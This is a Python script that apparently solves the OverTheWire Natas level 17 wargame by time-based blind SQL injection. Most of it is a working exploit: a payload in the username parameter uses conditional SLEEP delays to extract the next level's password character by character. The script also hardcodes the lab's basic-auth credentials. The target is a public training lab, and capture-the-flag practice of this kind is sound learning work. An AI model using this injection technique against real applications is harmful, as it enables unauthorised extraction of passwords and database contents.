# Blind SQL Injection--Time Based
# Importing stuff
import requests # allows you to send HTTP requests using Python.
import string

# Store password here
natas18password = ""

# add all the characters needed
charset = (string.digits + string.ascii_letters)

# length of the password is 32 characters
passLength = 32

print("Running...\n")
 
# iterates through indices - used to retrieve different characters from the password
for i in range(passLength):
  passIndex = i+1

  # iterates through characters to test if it's a match
  for char in charset:

    # If the character matches, website waits for 2 seconds before executing
    natasParam = 'natas18" AND IF(BINARY substring(password, %d, 1) = "%s", SLEEP(2), SLEEP(0)) AND "1"="1' % (passIndex, char) 
    
    # passes natasParam (above) to website
    r = requests.get(
      'http://natas17.natas.labs.overthewire.org',
      auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), # basic auth
      params={'username': natasParam}
    )

    # If the time elapsed is greater than 2, that means the character is a match, so it's added to the password
    if r.elapsed.seconds >= 2:
      
      natas18password = natas18password + char
      print(natas18password) 
      break  

print("\nFinal: %s" % natas18password)




  


